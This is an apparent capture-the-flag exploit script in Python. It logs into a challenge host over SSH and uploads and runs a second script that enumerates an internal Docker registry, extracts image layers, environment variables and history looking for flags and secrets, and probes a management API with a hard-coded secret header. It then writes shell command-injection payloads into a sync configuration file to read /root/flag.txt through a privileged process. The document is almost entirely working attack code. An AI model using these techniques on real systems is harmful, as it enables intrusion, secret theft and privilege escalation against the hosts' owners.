#!/usr/bin/env python3
import paramiko, time, json, textwrap

HOST, PORT, USER, PW = "instance.ctf.tdho.st", 33039, "player", "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PW, timeout=12)

def cmd(c, t=20):
    i, o, e = ssh.exec_command(c, timeout=t)
    return (o.read() + e.read()).decode(errors="replace")

print("=== BASIC ===")
print(cmd("id; hostname; cat /etc/hosts; cat /proc/net/route | head -5; ls -la /opt/mc/scripts/"))

print("=== FLAG CHECKS ===")
for p in ["/tmp/flag_out.txt", "/tmp/f", "/opt/mc/config/sync-result.conf"]:
    print(p, ":", repr(cmd(f"cat {p} 2>&1")[:200]))

REMOTE = textwrap.dedent(r'''
import urllib.request, json, gzip, tarfile, io, socket, struct, os, time

def gateway():
    with open("/proc/net/route") as f:
        next(f)
        for line in f:
            parts = line.strip().split()
            if parts[1] == "00000000":
                return socket.inet_ntoa(struct.pack("<L", int(parts[2], 16)))
    return "172.17.0.1"

def get(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read()

gw = gateway()
print("GATEWAY", gw)
reg = None
for ip in [gw, "172.27.0.1", "172.31.0.1", "172.17.0.1"]:
    base = f"http://{ip}:5000"
    try:
        cat = json.loads(get(base + "/v2/_catalog", timeout=2))
        reg = base
        print("REGISTRY", base, cat)
        break
    except Exception as e:
        print("no registry", ip, e)

if not reg:
    raise SystemExit("no registry")

repos = json.loads(get(reg + "/v2/_catalog").decode())["repositories"]
targets = ["sync-loop.sh", "sync-agent.sh", "watcher.sh", "flag"]
for repo in repos:
    tags = json.loads(get(reg + f"/v2/{repo}/tags/list").decode()).get("tags") or []
    print("REPO", repo, tags)
    for tag in tags:
        img = f"{repo}:{tag}"
        req = urllib.request.Request(
            reg + f"/v2/{repo}/manifests/{tag}",
            headers={"Accept": "application/vnd.docker.distribution.manifest.v2+json"},
        )
        m = json.loads(get(req.get_full_url(), headers=dict(req.header_items())))
        for layer in m.get("layers", []):
            data = get(reg + f"/v2/{repo}/blobs/{layer['digest']}", timeout=15)
            tf = None
            for raw in [data, gzip.decompress(data) if data[:2] == b"\x1f\x8b" else None]:
                if raw is None:
                    continue
                try:
                    tf = tarfile.open(fileobj=io.BytesIO(raw), mode="r:*")
                    break
                except Exception:
                    pass
            if not tf:
                continue
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                name = member.name
                content = tf.extractfile(member).read()
                if any(t in name for t in targets) or b"tdho{" in content or b"Kaal{" in content:
                    print("\n===FILE===", img, name, "size", len(content))
                    print(content.decode(errors="replace")[:15000])
        if "config" in m:
            cfg = json.loads(get(reg + f"/v2/{repo}/blobs/{m['config']['digest']}").decode())
            env = cfg.get("config", {}).get("Env", [])
            if env:
                print("\nENV", img, env)
            for h in cfg.get("history", []):
                cb = h.get("created_by", "")
                if any(x in cb for x in ["sync-loop", "FLAG", "flag", "ssh", "SECRET"]):
                    print("HIST", img, cb[:300])

# management API
for ip in [gw, "172.27.0.1"]:
    for path in ["/", "/sync/result", "/flag", "/api/flag"]:
        for hdr in [{}, {"X-Secret": "dOpKC729CoeywJl9pSUPcAGmaiFhtkzd7CD0jJPQ"}]:
            try:
                req = urllib.request.Request(f"http://{ip}:8080{path}", headers=hdr)
                body = get(req.get_full_url(), headers=hdr, timeout=2).decode(errors="replace")
                if body.strip():
                    print("API", ip, path, hdr, body[:500])
            except Exception as e:
                pass
''')

sftp = ssh.open_sftp()
with sftp.open("/tmp/exploit.py", "w") as f:
    f.write(REMOTE)
sftp.close()

print("=== REGISTRY EXTRACT ===")
print(cmd("python3 /tmp/exploit.py", 120))

# Based on sync-agent docs: sync-loop copies config value to sync.trigger
# Try all known payload formats
tests = [
    ("force", "talldwarf-sync-force=true"),
    ("sync", "talldwarf-sync=true"),
    ("cmd_flag", "talldwarf-sync-command=cat /root/flag.txt > /tmp/flag.txt && chmod 777 /tmp/flag.txt"),
    ("cmd_copy", "talldwarf-sync-command=cp /opt/mc/.sync/sync.result /opt/mc/config/out.conf && chown player:player /opt/mc/config/out.conf"),
    ("cmd_chmod", "talldwarf-sync-command=chmod 755 /opt/mc/.sync && chmod 644 /opt/mc/.sync/sync.result"),
    ("inject1", "talldwarf-sync=true; cat /root/flag.txt > /tmp/flag.txt"),
    ("inject2", "talldwarf-sync-command=$(cat /root/flag.txt > /tmp/flag.txt)"),
    ("eval", "talldwarf-sync-command=eval cat /root/flag.txt"),
]

print("=== SYNC TESTS ===")
for name, payload in tests:
    cmd(f'echo "{payload}" > /opt/mc/config/sync-request.conf')
    time.sleep(10)
    checks = cmd("ls -la /tmp/flag.txt /opt/mc/config/out.conf /opt/mc/config/sync-result.conf 2>&1")
    content = ""
    for p in ["/tmp/flag.txt", "/opt/mc/config/out.conf", "/opt/mc/config/sync-result.conf"]:
        content += cmd(f"cat {p} 2>/dev/null")
    sync_result = cmd("cat /opt/mc/.sync/sync.result 2>&1")
    print(f"\n--- {name} ---")
    print(checks)
    if content.strip():
        print("CONTENT:", content[:500])
    if sync_result.strip() and "denied" not in sync_result:
        print("SYNC.RESULT:", sync_result)
    if "tdho{" in content or "Kaal{" in content or "tdho{" in sync_result:
        print("*** FLAG FOUND ***")
        break

print("=== PROC 16 ===")
print(cmd("ls -la /proc/16/fd/ 2>&1; cat /proc/16/cmdline | tr '\\0' ' '; echo"))

ssh.close()
